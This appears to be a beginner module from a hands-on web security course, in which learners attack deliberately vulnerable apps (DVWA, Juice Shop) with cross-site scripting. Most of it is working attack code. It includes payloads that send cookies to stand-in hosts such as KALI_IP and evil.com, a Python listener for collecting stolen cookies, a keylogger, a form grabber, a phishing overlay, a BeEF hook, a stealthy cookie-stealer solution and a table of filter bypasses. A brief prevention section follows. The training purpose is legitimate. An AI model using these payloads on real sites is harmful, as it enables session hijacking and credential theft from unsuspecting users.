# Beginner Module 2: Cross-Site Scripting (XSS)

**Difficulty:** ⭐ Beginner  
**Time Required:** 2-3 hours  
**Prerequisites:** Completed Module 1, DVWA accessible

---

## Learning Objectives

By the end of this module, you will be able to:

- Understand the three types of XSS attacks
- Identify XSS vulnerabilities in web applications
- Craft XSS payloads for different contexts
- Steal cookies using XSS
- Understand XSS prevention techniques

---

## What is Cross-Site Scripting (XSS)?

XSS is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The victim's browser executes the attacker's code as if it came from the trusted website.

### Types of XSS

| Type | Description | Persistence |
|------|-------------|-------------|
| **Reflected** | Payload in URL/request, reflected in response | No (one-time) |
| **Stored** | Payload saved in database, shown to all users | Yes (permanent) |
| **DOM-based** | Payload manipulates client-side JavaScript | Varies |

### Why is XSS Dangerous?

- **Session Hijacking:** Steal user cookies/sessions
- **Credential Theft:** Capture login forms
- **Malware Distribution:** Redirect to malicious sites
- **Defacement:** Modify page content
- **Keylogging:** Capture user keystrokes

---

## Lab Setup

### Access DVWA

1. Ensure port forwarding:
   ```bash
   kubectl port-forward -n vulnerable-apps svc/dvwa-service 8080:80 &
   ```

2. Open: http://localhost:8080
3. Login: `admin` / `password`
4. Set Security Level: **Low**

### Prepare Kali for Cookie Stealing

```bash
kubectl exec -it -n attacker deploy/kali-attacker -- /bin/bash

# Get the Kali pod's IP address (you'll need this later)
hostname -I
```

---

## Exercise 2.1: Reflected XSS

### Location

Navigate to: **DVWA → XSS (Reflected)**

### How It Works

The page takes your name as input and displays "Hello [name]".

### Step 1: Normal Input

Enter: `John`

Output: `Hello John`

### Step 2: Test for XSS

Enter:
```html
<script>alert('XSS')</script>
```

**Result:** A JavaScript alert box appears!

### Step 3: More Payloads

Try these alternatives:

```html
<!-- Image error handler -->
<img src=x onerror="alert('XSS')">

<!-- SVG onload -->
<svg onload="alert('XSS')">

<!-- Body onload (may not work in all contexts) -->
<body onload="alert('XSS')">

<!-- Input autofocus -->
<input autofocus onfocus="alert('XSS')">
```

### Understanding the Vulnerability

**Vulnerable Code:**
```php
$html .= '<pre>Hello ' . $_GET['name'] . '</pre>';
```

No sanitization! Your input is directly inserted into the HTML.

<details>
<summary>✅ Why All These Payloads Work</summary>

Each payload uses a different HTML element/event to execute JavaScript:
- `<script>` - Direct script execution
- `onerror` - Fires when image fails to load
- `onload` - Fires when element loads
- `onfocus` - Fires when element receives focus

Having multiple options is important because WAFs may block some patterns.

</details>

---

## Exercise 2.2: Stored XSS

### Location

Navigate to: **DVWA → XSS (Stored)**

### How It Works

This is a guestbook where visitors can leave messages. Messages are stored in the database and shown to all visitors.

### Step 1: Leave a Normal Message

- Name: `Alice`
- Message: `Hello everyone!`

The message appears in the guestbook.

### Step 2: Inject XSS

- Name: `Hacker`
- Message: `<script>alert('Stored XSS')</script>`

**Result:** Every visitor to this page will see the alert!

### Step 3: The Danger

Unlike reflected XSS, stored XSS:
- Affects ALL users who view the page
- Persists until removed from the database
- Doesn't require tricking users into clicking a link

### More Malicious Payloads

**Redirect users:**
```html
<script>window.location='http://evil.com'</script>
```

**Deface the page:**
```html
<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>
```

<details>
<summary>💡 Note on Input Length</summary>

You may notice the Name field has a character limit. This is only enforced client-side! You can:

1. Use browser developer tools to change `maxlength`
2. Intercept the request with Burp Suite
3. Send the request directly with curl

</details>

---

## Exercise 2.3: Cookie Stealing

### Objective

Steal another user's session cookie using XSS.

### Step 1: Set Up a Listener in Kali

```bash
# In Kali pod
python3 -m http.server 8000
```

Or create a more sophisticated listener:

```bash
cat > /tmp/steal.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse as urlparse

class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/steal' in self.path:
            parsed = urlparse.urlparse(self.path)
            params = urlparse.parse_qs(parsed.query)
            if 'c' in params:
                cookie = params['c'][0]
                print(f"\n{'='*50}")
                print(f"[+] STOLEN COOKIE:")
                print(f"    {cookie}")
                print(f"{'='*50}\n")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

print("[*] Cookie stealer listening on port 8000...")
print("[*] Waiting for stolen cookies...\n")
HTTPServer(('0.0.0.0', 8000), StealHandler).serve_forever()
EOF

python3 /tmp/steal.py
```

### Step 2: Get Kali's IP

```bash
# In another Kali terminal or before starting the listener
kubectl exec -n attacker deploy/kali-attacker -- hostname -I
```

Note: Since we're in Kubernetes, use the service DNS name instead:
```
kali-attacker.attacker.svc.cluster.local
```

Or the pod IP (e.g., `10.244.0.15`)

### Step 3: Inject the Cookie Stealer

In DVWA XSS (Stored), enter:

**Name:** `EvilUser`

**Message:**
```html
<script>new Image().src='http://KALI_IP:8000/steal?c='+document.cookie;</script>
```

Replace `KALI_IP` with your Kali pod's IP address.

### Step 4: Trigger the Attack

1. The payload is now stored in the guestbook
2. Any user visiting the page will have their cookie stolen
3. Check your Kali listener for stolen cookies!

### Step 5: Hijack the Session

Once you have a stolen cookie (PHPSESSID), you can use it:

```bash
# Access DVWA as the victim
curl -H "Cookie: security=low; PHPSESSID=STOLEN_SESSION_ID" \
  http://dvwa-service.vulnerable-apps.svc.cluster.local/
```

<details>
<summary>✅ Full Attack Flow</summary>

1. Attacker injects cookie-stealing script into guestbook
2. Victim visits guestbook page
3. Victim's browser executes the script
4. Script sends victim's cookie to attacker's server
5. Attacker uses cookie to impersonate victim

</details>

---

## Exercise 2.4: Advanced XSS Payloads

### Keylogger

Capture everything the user types:

```html
<script>
document.onkeypress = function(e) {
  new Image().src = 'http://KALI_IP:8000/log?key=' + e.key;
}
</script>
```

### Form Grabber

Steal form data when submitted:

```html
<script>
document.forms[0].onsubmit = function() {
  var data = new FormData(this);
  var params = new URLSearchParams(data).toString();
  new Image().src = 'http://KALI_IP:8000/form?' + params;
}
</script>
```

### Phishing Overlay

Create a fake login form:

```html
<script>
document.body.innerHTML = '<h2>Session Expired</h2><form action="http://KALI_IP:8000/phish" method="GET"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
</script>
```

### BeEF Hooking

The Browser Exploitation Framework can take full control of a hooked browser:

```html
<script src="http://KALI_IP:3000/hook.js"></script>
```

---

## Exercise 2.5: XSS on Juice Shop

### Access Juice Shop

```bash
kubectl port-forward -n vulnerable-apps svc/juice-shop-service 3000:3000 &
```

Open: http://localhost:3000

### DOM-Based XSS

Try this URL:
```
http://localhost:3000/#/search?q=<iframe src="javascript:alert('xss')">
```

### Reflected XSS in Track Order

1. Go to "Track Order"
2. Enter: `<iframe src="javascript:alert('xss')">`
3. Click Track

### Challenge: Find More XSS

Juice Shop has multiple XSS vulnerabilities. Try finding them in:
- User registration
- Product reviews
- Contact form

<details>
<summary>💡 Hints</summary>

- Check the scoreboard at `/#/score-board` for XSS challenges
- Try different encoding: `%3Cscript%3Ealert(1)%3C/script%3E`
- Look for places where user input is displayed

</details>

---

## Exercise 2.6: Bypassing Basic Filters

### DVWA Medium Security

Set DVWA to **Medium** security level and try XSS again.

### The Filter

Medium security uses `str_replace()` to remove `<script>` tags:

```php
$name = str_replace('<script>', '', $_GET['name']);
```

### Bypass Techniques

**Case variation:**
```html
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</ScRiPt>
```

**Nested tags:**
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

**Alternative tags:**
```html
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

<details>
<summary>✅ Working Bypass for Medium</summary>

The filter only removes `<script>` (lowercase). These work:

```html
<SCRIPT>alert('XSS')</SCRIPT>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
```

</details>

---

## Knowledge Check

Test your understanding:

1. What's the difference between reflected and stored XSS?
2. Why is stored XSS more dangerous?
3. What attribute can trigger JavaScript on an `<img>` tag?
4. How can you steal cookies with XSS?
5. What header helps prevent XSS?

<details>
<summary>✅ Answers</summary>

1. Reflected XSS is in the request/response, stored XSS is saved in the database
2. It affects all users who view the page, not just those who click a malicious link
3. `onerror` (when the image fails to load)
4. `document.cookie` to read, then send to attacker's server via `new Image().src`
5. `Content-Security-Policy` (CSP) - restricts what scripts can execute

</details>

---

## Prevention

### How to Prevent XSS

**1. Output Encoding**

```php
// VULNERABLE
echo $user_input;

// SECURE
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

**2. Content Security Policy (CSP)**

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

This prevents inline scripts and scripts from other domains.

**3. HTTPOnly Cookies**

```
Set-Cookie: session=abc123; HttpOnly
```

JavaScript cannot access HTTPOnly cookies, preventing cookie theft.

**4. Input Validation**

- Whitelist allowed characters
- Reject or encode dangerous characters
- Use type checking (numbers, emails, etc.)

**5. Use Safe APIs**

```javascript
// VULNERABLE
element.innerHTML = userInput;

// SAFER
element.textContent = userInput;
```

---

## Challenge Lab

### Scenario

A company's support ticket system stores user messages. Create a sophisticated attack that:

1. Steals the admin's cookie when they view your ticket
2. Includes a fallback if the first method is blocked
3. Works silently without alerting the user

### Requirements

- Use stored XSS in DVWA guestbook
- Cookie should be sent to your Kali listener
- No visible alerts or redirects

<details>
<summary>✅ Challenge Solution</summary>

**Stealthy Cookie Stealer:**

```html
<img src=x onerror="(function(){var i=new Image();i.src='http://KALI_IP:8000/steal?c='+btoa(document.cookie);})()">
```

Why this is better:
- Uses `btoa()` to base64 encode (handles special characters)
- Uses an IIFE to avoid polluting global scope
- `<img>` tag is less suspicious than `<script>`
- Invisible 1x1 pixel image request

**With Multiple Fallbacks:**

```html
<svg onload="fetch('http://KALI_IP:8000/steal?c='+btoa(document.cookie))"><img src=x onerror="new Image().src='http://KALI_IP:8000/steal?c='+btoa(document.cookie)">
```

</details>

---

## Summary

In this module, you learned:

- ✅ Three types of XSS (Reflected, Stored, DOM)
- ✅ How to find and exploit XSS vulnerabilities
- ✅ Cookie stealing techniques
- ✅ Bypassing basic filters
- ✅ XSS prevention methods

### Next Steps

Continue to: **Beginner Module 3: Reconnaissance**

---

## Quick Reference

### XSS Payload Cheat Sheet

| Context | Payload |
|---------|---------|
| Basic | `<script>alert('XSS')</script>` |
| Image | `<img src=x onerror=alert('XSS')>` |
| SVG | `<svg onload=alert('XSS')>` |
| Body | `<body onload=alert('XSS')>` |
| Input | `<input onfocus=alert('XSS') autofocus>` |
| Anchor | `<a href="javascript:alert('XSS')">click</a>` |
| Event | `" onmouseover="alert('XSS')` |

### Cookie Stealing

```javascript
// Basic
document.location='http://evil.com/?c='+document.cookie

// Silent
new Image().src='http://evil.com/?c='+document.cookie

// With encoding
fetch('http://evil.com/?c='+btoa(document.cookie))
```

### Filter Bypass Techniques

| Filter | Bypass |
|--------|--------|
| `<script>` blocked | `<SCRIPT>`, `<img onerror>` |
| `alert` blocked | `confirm()`, `prompt()` |
| Quotes blocked | Use backticks or String.fromCharCode() |
| Parentheses blocked | Use `onerror=alert\`XSS\`` |
